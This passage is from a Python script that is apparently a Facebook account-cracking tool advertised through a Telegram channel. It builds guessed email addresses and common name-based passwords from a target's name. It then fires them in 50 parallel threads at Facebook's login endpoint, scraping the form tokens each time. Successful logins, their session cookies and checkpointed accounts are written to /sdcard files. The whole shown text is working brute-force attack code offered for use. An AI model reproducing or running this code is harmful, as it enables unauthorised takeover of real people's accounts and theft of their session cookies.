    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,3))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def mkl3():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def mkl4():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,5))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def mkl5():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+'.'+last+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+'.'+last[0:1]+'.'+digitx,first+'.'+last+'.'+digitx,first[1:]+'.'+last[1:]+'.'+digitx])
            pwx = ['u'+first+last,'mg'+first+last,'ko'+first+last,'daw'+first+last,'ma'+first+last,'oo'+first+last,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',first+last+'12345',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def rcrack2(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            pro = random.choice(ugen3)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[MKL-OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;36m'+coki+'\033[0;97m')
                print('\033[1;34m  >>>-----------------------------------------------➤')
                cek_apk(session,coki)
                open('/sdcard/MKL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m[MKL-CP] ' +uid+ ' | ' +ps+'')
                open('/sdcard/MKL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s[MKL-M3]-[%s]-[%s]-[OK]-[%s]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass       
        



logo = ("""\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××
\033[1;33m|\033[1;33m      ____    ____     ___  ____      _____         \033[1;33m |
\033[1;33m|\033[1;33m     |_   \  /   _|   |_  ||_  _|    |_   _|        \033[1;33m |
\033[1;33m|\033[1;32m       |   \/   |       | |_/ /        | |          \033[1;33m |
\033[1;33m|\033[1;32m       | |\  /| |       |  __'.        | |   _      \033[1;33m |
\033[1;33m|\033[1;91m      _| |_\/_| |_  _  _| |  \ \_  _  _| |__/ |     \033[1;33m |
\033[1;33m|\033[1;91m     |_____||_____|(_)|____||____|(_)|________|     \033[1;33m |
\033[1;33m|                                                   \033[1;33m  |
\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××
\033[1;93m|\033[1;32m>> SEND BY     : https://t.me/+LRlET_sIrUcxMTk1\033[1;93m |
\033[1;93m|\033[1;35m>> Teligerm     :      OX CYBER TEAM     \033[1;93m |
\033[1;93m|\033[1;36m>> Tool Ststus  : Myanmar Number & MAIL & USER NAME \033[1;93m |
\033[1;93m|\033[1;33m>> Tool Buy     : INDIA                       \033[1;93m |
\033[1;93m|\033[1;91m>> Tool Virsion : 8.3 Pro                           \033[1;93m |
\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××""")
print(logo)

            
if __name__ == "__main__":
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r[\x1b[1;92m•\x1b[1;97m] \x1b[38;5;42mLoading...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    main()    
      